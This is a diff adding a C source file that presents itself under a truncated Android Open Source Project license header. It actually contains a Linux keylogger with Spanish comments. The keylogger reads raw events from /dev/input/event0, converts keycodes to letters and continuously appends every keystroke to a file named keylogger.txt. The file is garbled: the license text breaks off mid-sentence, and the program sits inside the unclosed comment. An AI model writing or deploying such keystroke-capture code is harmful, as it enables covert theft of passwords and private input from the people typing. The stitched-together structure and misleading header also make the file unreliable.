@@ -1,0 +1,99 @@
+/*
+ * Copyright (C) 2011 The Android Open Source Project
+ *
+ * Licensed under the Apache License, Version 2.0 (the "License");
+ * you may not use this file except in compliance with the License.
+ * You may obtain a copy of the License at
+ *
+ *      http://www.apache.org/licenses/LICENSE-2.0
+ *
+ * Unless required by applicable law or agreed to in writing, software
+ * distributed under the License is distributed on an "AS IS" BASIS,
+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+ * See the License for the specific language governing permissions and
+ * limitations
+ #include <stdio.h>
+#include <fcntl.h>
+#include <unistd.h>
+#include <linux/input.h>
+#include <errno.h>
+
+#define LOGFILEPATH "/home/ferpalma21/keylogger.txt"
+
+// Función para convertir el código de la tecla en un carácter ASCII
+char keycode_to_char(int keycode) {
+    // Mapeo básico para algunos códigos de teclas; este mapeo puede ser ampliado según sea necesario
+    switch (keycode) {
+        case KEY_A: return 'a';
+        case KEY_B: return 'b';
+        case KEY_C: return 'c';
+        case KEY_D: return 'd';
+        case KEY_E: return 'e';
+        case KEY_F: return 'f';
+        case KEY_G: return 'g';
+        case KEY_H: return 'h';
+        case KEY_I: return 'i';
+        case KEY_J: return 'j';
+        case KEY_K: return 'k';
+        case KEY_L: return 'l';
+        case KEY_M: return 'm';
+        case KEY_N: return 'n';
+        case KEY_O: return 'o';
+        case KEY_P: return 'p';
+        case KEY_Q: return 'q';
+        case KEY_R: return 'r';
+        case KEY_S: return 's';
+        case KEY_T: return 't';
+        case KEY_U: return 'u';
+        case KEY_V: return 'v';
+        case KEY_W: return 'w';
+        case KEY_X: return 'x';
+        case KEY_Y: return 'y';
+        case KEY_Z: return 'z';
+        case KEY_SPACE: return ' ';
+        case KEY_ENTER: return '\n';
+        case KEY_BACKSPACE: return '\b';
+        // Añadir más mapeos según sea necesario
+        default: return '\0'; // Carácter no mapeado
+    }
+}
+
+int main() {
+    struct input_event ev;
+    char path_keyboard[40] = "/dev/input/event0";  // Ejemplo de dispositivo; ajustar según sea necesario
+
+    int device_keyboard = open(path_keyboard, O_RDONLY);
+    if (device_keyboard < 0) {
+        perror("Error opening device");
+        return 1;
+    }
+
+    FILE *fp = fopen(LOGFILEPATH, "a");
+    if (!fp) {
+        perror("Error opening log file");
+        close(device_keyboard);
+        return 1;
+    }
+
+    while (1) {
+        ssize_t bytes_read = read(device_keyboard, &ev, sizeof(ev));
+        if (bytes_read < 0) {
+            perror("Error reading device");
+            break;
+        }
+
+        if (ev.type == EV_KEY && ev.value == 0) {
+            char c = keycode_to_char(ev.code);
+            if (c != '\0') {
+                fprintf(fp, "%c", c);
+                fflush(fp);
+            }
+        }
+    }
+
+    fclose(fp);
+    close(device_keyboard);
+    return 0;
+}
+
+ */
